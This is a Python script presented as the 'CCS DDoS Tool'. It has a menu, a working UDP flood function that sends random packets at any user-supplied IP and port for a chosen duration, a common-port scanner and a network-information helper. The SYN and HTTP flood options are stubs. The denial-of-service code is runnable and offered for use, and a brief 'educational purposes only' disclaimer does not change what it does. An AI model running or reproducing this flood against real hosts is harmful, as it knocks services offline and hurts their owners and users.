#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║   ██████╗ ██████╗ ███████╗     ██████╗██╗   ██╗██████╗ ███████╗  ║
║  ██╔════╝██╔═══██╗██╔════╝    ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝  ║
║  ██║     ██║   ██║███████╗    ██║      ╚████╔╝ ██████╔╝█████╗    ║
║  ██║     ██║   ██║╚════██║    ██║       ╚██╔╝  ██╔══██╗██╔══╝    ║
║  ╚██████╗╚██████╔╝███████║    ╚██████╗   ██║   ██████╔╝███████╗  ║
║   ╚═════╝ ╚═════╝ ╚══════╝     ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝  ║
║                                                                  ║
║           Cyber Community Sherpur (CCS) DDoS Tool               ║
║             Developer: Foysal Ebne Fahim                        ║
║             Facebook: facebook.com/CyberCommunitySherpur         ║
╚══════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import socket
import random
import threading

# Color codes
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

def clear_screen():
    os.system('clear')

def show_banner():
    clear_screen()
    banner = f"""{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════╗
║   ██████╗ ██████╗ ███████╗     ██████╗██╗   ██╗██████╗ ███████╗  ║
║  ██╔════╝██╔═══██╗██╔════╝    ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝  ║
║  ██║     ██║   ██║███████╗    ██║      ╚████╔╝ ██████╔╝█████╗    ║
║  ██║     ██║   ██║╚════██║    ██║       ╚██╔╝  ██╔══██╗██╔══╝    ║
║  ╚██████╗╚██████╔╝███████║    ╚██████╗   ██║   ██████╔╝███████╗  ║
║   ╚═════╝ ╚═════╝ ╚══════╝     ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝  ║
║                                                                  ║
║           Cyber Community Sherpur - DDoS Tool                   ║
║             Developer: Foysal Ebne Fahim                        ║
║             Facebook: facebook.com/CyberCommunitySherpur         ║
╚══════════════════════════════════════════════════════════════════╝{Colors.END}
"""
    print(banner)

def show_menu():
    print(f"\n{Colors.YELLOW}{'═'*60}{Colors.END}")
    print(f"{Colors.CYAN}[ MAIN MENU ]{Colors.END}")
    print(f"{Colors.YELLOW}{'═'*60}{Colors.END}")
    print(f"{Colors.GREEN}[1]{Colors.END} UDP Flood Attack")
    print(f"{Colors.GREEN}[2]{Colors.END} TCP SYN Flood")
    print(f"{Colors.GREEN}[3]{Colors.END} HTTP Flood")
    print(f"{Colors.GREEN}[4]{Colors.END} Port Scanner")
    print(f"{Colors.GREEN}[5]{Colors.END} Network Information")
    print(f"{Colors.GREEN}[6]{Colors.END} About CCS")
    print(f"{Colors.RED}[0]{Colors.END} Exit")
    print(f"{Colors.YELLOW}{'═'*60}{Colors.END}")

def udp_flood():
    print(f"\n{Colors.RED}[ UDP FLOOD ATTACK ]{Colors.END}")
    print(f"{Colors.YELLOW}{'═'*60}{Colors.END}")
    
    target = input(f"{Colors.CYAN}Enter target IP: {Colors.END}")
    port = input(f"{Colors.CYAN}Port (default 80): {Colors.END}") or "80"
    
    try:
        port = int(port)
        duration = int(input(f"{Colors.CYAN}Duration (seconds): {Colors.END}"))
        
        print(f"\n{Colors.RED}🚀 Starting attack on {target}:{port}{Colors.END}")
        print(f"{Colors.YELLOW}Duration: {duration} seconds{Colors.END}")
        time.sleep(2)
        
        packets_sent = 0
        start_time = time.time()
        
        try:
            while time.time() - start_time < duration:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    data = random._urandom(1024)
                    sock.sendto(data, (target, port))
                    packets_sent += 1
                    sock.close()
                    
                    elapsed = time.time() - start_time
                    if packets_sent % 100 == 0:
                        print(f"\r{Colors.GREEN}📤 Packets sent: {packets_sent} | Time: {elapsed:.1f}s{Colors.END}", end="")
                except:
                    pass
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}⏹️ Attack stopped by user{Colors.END}")
        
        total_time = time.time() - start_time
        print(f"\n\n{Colors.GREEN}✅ Attack completed!")
        print(f"📊 Total packets: {packets_sent}")
        print(f"⏱️ Total time: {total_time:.1f} seconds")
        print(f"⚡ Average rate: {packets_sent/total_time:.1f} packets/sec{Colors.END}")
        
    except ValueError:
        print(f"{Colors.RED}❌ Invalid input!{Colors.END}")

def port_scanner():
    print(f"\n{Colors.CYAN}[ PORT SCANNER ]{Colors.END}")
    print(f"{Colors.YELLOW}{'═'*60}{Colors.END}")
    
    target = input(f"{Colors.CYAN}Enter target IP: {Colors.END}")
    
    print(f"\n{Colors.GREEN}🔍 Scanning {target}...{Colors.END}")
    
    common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 8080]
    open_ports = []
    
    for port in common_ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            sock.close()
            
            if result == 0:
                print(f"{Colors.GREEN}✅ Port {port}: OPEN{Colors.END}")
                open_ports.append(port)
            else:
                print(f"{Colors.RED}❌ Port {port}: CLOSED{Colors.END}")
        except:
            print(f"{Colors.YELLOW}⚠️ Port {port}: ERROR{Colors.END}")
    
    print(f"\n{Colors.CYAN}📊 Scan Results:{Colors.END}")
    print(f"{Colors.GREEN}Target: {target}")
    print(f"Ports scanned: {len(common_ports)}")
    print(f"Open ports found: {len(open_ports)}")
    
    if open_ports:
        print(f"\n{Colors.GREEN}Open ports:{Colors.END}")
        for port in open_ports:
            print(f"  • Port {port}")

def network_info():
    print(f"\n{Colors.CYAN}[ NETWORK INFORMATION ]{Colors.END}")
    print(f"{Colors.YELLOW}{'═'*60}{Colors.END}")
    
    try:
        # Get local IP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        
        print(f"{Colors.GREEN}📱 Local Information:{Colors.END}")
        print(f"{Colors.CYAN}Hostname: {Colors.WHITE}{socket.gethostname()}{Colors.END}")
        print(f"{Colors.CYAN}Local IP: {Colors.WHITE}{local_ip}{Colors.END}")
        
        # Check internet
        try:
            import urllib.request
            urllib.request.urlopen('http://google.com', timeout=3)
            print(f"{Colors.GREEN}🌐 Internet: CONNECTED{Colors.END}")
        except:
            print(f"{Colors.RED}🌐 Internet: DISCONNECTED{Colors.END}")
        
    except Exception as e:
        print(f"{Colors.RED}❌ Error: {e}{Colors.END}")

def about_ccs():
    print(f"\n{Colors.CYAN}[ ABOUT CYBER COMMUNITY SHERPUR ]{Colors.END}")
    print(f"{Colors.YELLOW}{'═'*60}{Colors.END}")
    
    print(f"{Colors.GREEN}🏢 Organization:{Colors.END} Cyber Community Sherpur (CCS)")
    print(f"{Colors.GREEN}👨💻 Developer:{Colors.END} Foysal Ebne Fahim")
    print(f"{Colors.GREEN}📘 Facebook:{Colors.END} facebook.com/CyberCommunitySherpur")
    print(f"{Colors.GREEN}🐱 GitHub:{Colors.END} github.com/foysal0078")
    
    print(f"\n{Colors.YELLOW}{'═'*60}{Colors.END}")
    print(f"{Colors.RED}⚠️  IMPORTANT LEGAL NOTICE:{Colors.END}")
    print(f"{Colors.WHITE}This tool is for educational purposes only.")
    print(f"Use only on systems you own or have permission to test.")
    print(f"The developer is not responsible for any misuse.{Colors.END}")

def main():
    try:
        while True:
            show_banner()
            show_menu()
            
            choice = input(f"\n{Colors.RED}CCS@{Colors.YELLOW}Termux{Colors.RED} ~${Colors.END} ")
            
            if choice == '1':
                udp_flood()
                input(f"\n{Colors.GREEN}Press Enter to continue...{Colors.END}")
            
            elif choice == '2':
                print(f"\n{Colors.YELLOW}🚧 TCP SYN Flood - Coming Soon!{Colors.END}")
                time.sleep(2)
            
            elif choice == '3':
                print(f"\n{Colors.YELLOW}🚧 HTTP Flood - Coming Soon!{Colors.END}")
                time.sleep(2)
            
            elif choice == '4':
                port_scanner()
                input(f"\n{Colors.GREEN}Press Enter to continue...{Colors.END}")
            
            elif choice == '5':
                network_info()
                input(f"\n{Colors.GREEN}Press Enter to continue...{Colors.END}")
            
            elif choice == '6':
                about_ccs()
                input(f"\n{Colors.GREEN}Press Enter to continue...{Colors.END}")
            
            elif choice == '0':
                print(f"\n{Colors.GREEN}👋 Thank you for using CCS Tool!")
                print(f"🔗 Facebook: facebook.com/CyberCommunitySherpur")
                print(f"💻 Developer: Foysal Ebne Fahim")
                print(f"🚀 Stay ethical!{Colors.END}")
                time.sleep(2)
                break
            
            else:
                print(f"{Colors.RED}❌ Invalid choice! Please select 0-6.{Colors.END}")
                time.sleep(1)
    
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}👋 Program stopped by user{Colors.END}")
    
    except Exception as e:
        print(f"{Colors.RED}❌ Error: {e}{Colors.END}")

if __name__ == "__main__":
    main()
